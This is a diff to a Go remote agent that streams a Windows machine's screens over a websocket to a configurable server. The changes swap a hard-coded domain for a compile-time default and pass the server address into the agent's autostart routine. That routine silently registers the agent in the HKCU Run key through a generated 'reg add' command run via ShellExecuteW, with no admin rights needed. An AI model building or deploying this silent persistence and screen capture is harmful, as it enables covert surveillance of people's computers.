@@ -40,8 +40,12 @@ type DisplayInfo struct {
 
 var currentDisplayIndex = 0
 
+// defaultServer can be overridden at compile time via:
+// -ldflags "-X main.defaultServer=your-domain.com"
+var defaultServer = "localhost:8080"
+
 func main() {
-	serverAddr := flag.String("server", "ak-ses-remote-agent.karpeekrn-uwu.site", "Server domain or IP (e.g. ak-ses-remote-agent.karpeekrn-uwu.site)")
+	serverAddr := flag.String("server", defaultServer, "Server domain or IP (e.g. your-server.domain.com:8080)")
 	targetID := flag.String("id", "", "Custom Agent ID (defaults to hostname)")
 	fps := flag.Int("fps", 20, "Target FPS for streaming (e.g. 15-30)")
 	quality := flag.Int("quality", 50, "JPEG Quality (1-100)")
@@ -53,7 +57,7 @@ func main() {
 	}
 
 	// Detect whether to use wss or ws
-	rawAddr := *serverAddr
+	rawAddr := strings.TrimRight(strings.TrimSpace(*serverAddr), "\x00 \t\r\n/")
 	scheme := "ws"
 	if strings.HasPrefix(rawAddr, "https://") {
 		scheme = "wss"
@@ -69,7 +73,7 @@ func main() {
 	rawAddr = strings.TrimRight(rawAddr, "/")
 
 	// Auto-configure startup in user registry (HKCU)
-	setupStartup()
+	setupStartup(rawAddr)
 
 	log.Printf("[+] Démarrage agent ak-ses ID: %s", *targetID)
 	log.Printf("[+] Connexion vers %s://%s/ws/agent", scheme, rawAddr)
@@ -196,7 +200,7 @@ func sendDisplays(conn *websocket.Conn) {
 	conn.WriteMessage(websocket.TextMessage, payload)
 }
 
-func setupStartup() {
+func setupStartup(serverHost string) {
 	if runtime.GOOS != "windows" {
 		return
 	}
@@ -225,7 +229,7 @@ func setupStartup() {
 
 	// Register in HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 	// No admin rights required
-	cmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ak-ses-agent" /t REG_SZ /d "\"%s\"" /f`, destPath)
+	cmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ak-ses-agent" /t REG_SZ /d "\"%s\" -server %s" /f`, destPath, serverHost)
 	_ = os.WriteFile(filepath.Join(destDir, "run.cmd"), []byte(cmd), 0644)
 	syscall.NewLazyDLL("shell32.dll").NewProc("ShellExecuteW").Call(
 		0,
